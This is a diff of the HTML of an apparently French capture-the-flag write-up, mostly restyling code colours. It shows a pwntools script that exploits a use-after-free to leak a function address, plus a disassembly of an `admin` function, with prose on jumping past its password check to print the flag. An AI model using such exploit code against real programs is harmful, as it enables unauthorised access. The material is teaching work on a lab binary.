+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">manuel</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;manuel()&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r<span style="color:#ff79c6">.</span>recv()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">global</span> r
+</span></span><span style="display:flex;"><span>    r <span style="color:#ff79c6">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    construire(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">16</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    supprimer()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">16</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> manuel()
+</span></span><span style="display:flex;"><span>    leak <span style="color:#ff79c6">=</span> manuel()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    roll <span style="color:#f92672">=</span> u64(leak[leak<span style="color:#f92672">.</span>index(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfc</span><span style="color:#e6db74">&#39;</span>):]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>    roll <span style="color:#ff79c6">=</span> u64(leak[leak<span style="color:#ff79c6">.</span>index(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xfc</span><span style="color:#f1fa8c">&#39;</span>):]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;roll @&#34;</span>, hex(roll))
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;roll @&#34;</span>, <span style="color:#8be9fd;font-style:italic">hex</span>(roll))
 </span></span></code></pre></div><p>On commence par créer quelques fonctions qui nous facilitent la communication avec l&rsquo;executable, puis on récupère le leak dans une variable. On peut vérifier le bon fonctionnement du script avec <code>pwndbg</code>:</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/235506603-b7a42176-5182-4dca-96a5-725d28c91942.png" alt="2023-05-01-195650_1363x191_scrot"></p>
 <p>Le script crée un robot avec un nom de <strong>16</strong> chars, le détruit, puis crée un mode d&rsquo;emploi de <strong>16</strong> chars (pour ne pas réecrire les adresses des variables), et lis le manuel pour avoir les <em>leaks</em>. On voit que l&rsquo;adresse affichée est bien celle de la fonction <em>roll</em>.</p>
@@ -486,73 +490,73 @@
 <p>Maintenant que nous savons quelle fonction réecrire, par quoi pouvons-nous la réecrire ?</p>
 <p>La fonction <code>admin</code> contient un appel à <code>/bin/cat flag.txt</code> mais elle semble protégée par un mot de passe&hellip; ou l&rsquo;est-elle réellement ? Puisque nous connaissons l&rsquo;adresse de <em>roll</em>, rien ne nous oblige à réecrire <code>makeNoise</code> par l&rsquo;adresse de <code>admin</code>, nous pouvons très bien la réecrire par une adresse plus loin dans <code>admin</code>, de préférence <strong>après</strong> la vérification du mot de passe.</p>
 <p>On peut faire ceci avec <code>pwndbg</code> et notre <em>leak</em> de tout à l&rsquo;heure, on va commencer par désassembler la fonction <code>admin</code> pour savoir où <em>jump</em>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>disass admin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>disass admin
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function admin:
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x90</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13e2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>],rdi
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR fs:<span style="color:#ae81ff">0x28</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>],rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>:	xor    eax,eax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b13ff</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1402</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b10c0</span> <span style="color:#f92672">&lt;</span>strlen<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1407</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:	mov    rcx,rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b140a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;</span>:	lea    rdx,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b140e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x88</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1415</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;</span>:	mov    rsi,rcx
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1418</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b141b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1090</span> <span style="color:#f92672">&lt;</span>SHA256<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1420</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1427</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:	jmp    <span style="color:#ae81ff">0x55a4252b145f</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1429</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:	mov    eax,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b142c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">85</span><span style="color:#f92672">&gt;</span>:	cdqe   
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b142e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	movzx  eax,BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1433</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;</span>:	movzx  eax,al
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1436</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">95</span><span style="color:#f92672">&gt;</span>:	mov    edx,DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1439</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:	add    edx,edx
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b143b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	movsxd rdx,edx
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b143e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:	lea    rcx,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1442</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">107</span><span style="color:#f92672">&gt;</span>:	add    rcx,rdx
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1445</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>:	mov    edx,eax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1447</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc5f</span>]        <span style="color:#75715e"># 0x55a4252b20ad</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b144e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">119</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rcx
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1451</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">122</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1456</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">127</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b10d0</span> <span style="color:#f92672">&lt;</span>sprintf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b145b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">132</span><span style="color:#f92672">&gt;</span>:	add    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x1</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b145f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>:	cmp    DWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x74</span>],<span style="color:#ae81ff">0x1f</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1463</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">140</span><span style="color:#f92672">&gt;</span>:	jle    <span style="color:#ae81ff">0x55a4252b1429</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1465</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">142</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x50</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1469</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">146</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2bb0</span>]        <span style="color:#75715e"># 0x55a4252b4020 &lt;encrypted&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1470</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">153</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1473</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">156</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1120</span> <span style="color:#f92672">&lt;</span>strcmp<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1478</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">161</span><span style="color:#f92672">&gt;</span>:	test   eax,eax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b147a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">163</span><span style="color:#f92672">&gt;</span>:	jne    <span style="color:#ae81ff">0x55a4252b14b6</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b147c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">165</span><span style="color:#f92672">&gt;</span>:	mov    ecx,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1481</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>:	lea    rdx,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc2a</span>]        <span style="color:#75715e"># 0x55a4252b20b2</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1488</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">177</span><span style="color:#f92672">&gt;</span>:	lea    rsi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc2c</span>]        <span style="color:#75715e"># 0x55a4252b20bb</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b148f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">184</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc25</span>]        <span style="color:#75715e"># 0x55a4252b20bb</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b1496</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">191</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b149b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">196</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1070</span> <span style="color:#f92672">&lt;</span>execl<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">201</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc1d</span>]        <span style="color:#75715e"># 0x55a4252b20c4</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">208</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1140</span> <span style="color:#f92672">&lt;</span>perror<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">213</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x2</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">218</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1050</span> <span style="color:#f92672">&lt;</span>exit<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc0d</span>]        <span style="color:#75715e"># 0x55a4252b20ca</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">230</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1040</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">235</span><span style="color:#f92672">&gt;</span>:	nop
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">236</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">240</span><span style="color:#f92672">&gt;</span>:	sub    rax,QWORD PTR fs:<span style="color:#ae81ff">0x28</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">249</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x55a4252b14d7</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">251</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1110</span> <span style="color:#f92672">&lt;</span>__stack_chk_fail<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>:	leave  
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">257</span><span style="color:#f92672">&gt;</span>:	ret    
-</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#ff79c6">for</span> function admin:
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13d7</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">&gt;</span>:	push   rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13d8</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">&gt;</span>:	mov    rbp,rsp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13db</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">&gt;</span>:	sub    rsp,<span style="color:#bd93f9">0x90</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13e2</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x88</span>],rdi
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13e9</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">18</span><span style="color:#ff79c6">&gt;</span>:	mov    rax,QWORD PTR fs:<span style="color:#bd93f9">0x28</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13f2</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">27</span><span style="color:#ff79c6">&gt;</span>:	mov    QWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x8</span>],rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13f6</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">&gt;</span>:	xor    eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13f8</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">33</span><span style="color:#ff79c6">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x88</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b13ff</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">40</span><span style="color:#ff79c6">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1402</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">43</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b10c0</span> <span style="color:#ff79c6">&lt;</span>strlen@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1407</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">48</span><span style="color:#ff79c6">&gt;</span>:	mov    rcx,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b140a</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">51</span><span style="color:#ff79c6">&gt;</span>:	lea    rdx,[rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x70</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b140e</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">55</span><span style="color:#ff79c6">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x88</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1415</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">62</span><span style="color:#ff79c6">&gt;</span>:	mov    rsi,rcx
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1418</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">65</span><span style="color:#ff79c6">&gt;</span>:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b141b</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">68</span><span style="color:#ff79c6">&gt;</span>:	call   <span style="color:#bd93f9">0x55a4252b1090</span> <span style="color:#ff79c6">&lt;</span>SHA256@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1420</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">73</span><span style="color:#ff79c6">&gt;</span>:	mov    DWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x74</span>],<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1427</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">80</span><span style="color:#ff79c6">&gt;</span>:	jmp    <span style="color:#bd93f9">0x55a4252b145f</span> <span style="color:#ff79c6">&lt;</span>admin<span style="color:#ff79c6">+</span><span style="color:#bd93f9">136</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1429</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">82</span><span style="color:#ff79c6">&gt;</span>:	mov    eax,DWORD PTR [rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x74</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b142c</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">85</span><span style="color:#ff79c6">&gt;</span>:	cdqe   
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b142e</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">87</span><span style="color:#ff79c6">&gt;</span>:	movzx  eax,BYTE PTR [rbp<span style="color:#ff79c6">+</span>rax<span style="color:#ff79c6">*</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x70</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000055a4252b1433</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">92</span><span style="color:#ff79c6">&gt;</span>:	movzx  eax,al
